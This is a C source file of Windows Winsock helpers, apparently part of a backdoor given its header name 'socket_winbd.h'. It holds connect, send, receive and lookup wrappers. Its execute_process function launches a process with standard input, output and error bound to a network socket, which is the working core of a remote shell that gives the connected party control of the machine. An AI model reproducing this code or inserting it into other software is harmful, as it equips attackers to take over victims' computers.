#include "socket_winbd.h"

#pragma comment (lib, "Ws2_32.lib")
#define BUFFER_SIZE_DEFAULT 4096

int connect(SOCKET socks_instance, struct sockaddr_in session)
{
    int c = WSAConnect(socks_instance, (struct sockaddr*) & session, sizeof(session), 0, 0, 0, 0);
    if (c != 0) {
        closesocket(socks_instance);
        WSACleanup();
        return -1;
    }
    return 0;
}

int send_data(SOCKET socks_instance, char* buffer)
{
    Sleep(100);
    int s = send(socks_instance, buffer, strlen(buffer) + 1, 0);
    if (s == SOCKET_ERROR) {
        return -1;
    }
    else {
        return 0;
    }
}

int recv_data(SOCKET socks_instance, char* buffer, int len)
{
    Sleep(100);
    int i;
    i = recv(socks_instance, buffer, len, 0);
    if (i > 0) {
        return i;
    }
    else if (i == 0) {
        return 0;
    }
    else {
        return -1;
    }
}

void execute_process(SOCKET socks_instance, char* process)
{
    char Process[BUFFER_SIZE_DEFAULT];
    sprintf(Process, "%s", process);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socks_instance;
    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

char* ghostbyaddr_ipv4(struct hostent* remote_host,const char* buffer_addr)
{
    struct in_addr addr = { 0 };
    addr.S_un.S_addr = inet_addr(buffer_addr);
    remote_host = gethostbyaddr((char*)&addr, 4, AF_INET);
    return remote_host->h_name;
}

servent *gservbyport(struct servent* get_service_name,int port)
{
    get_service_name = getservbyport(ntohs(port), NULL);
    return get_service_name;
}

servent* gservbyname(struct servent* get_service_port, const char* name)
{
    get_service_port = getservbyname(name, NULL);
    return get_service_port;
}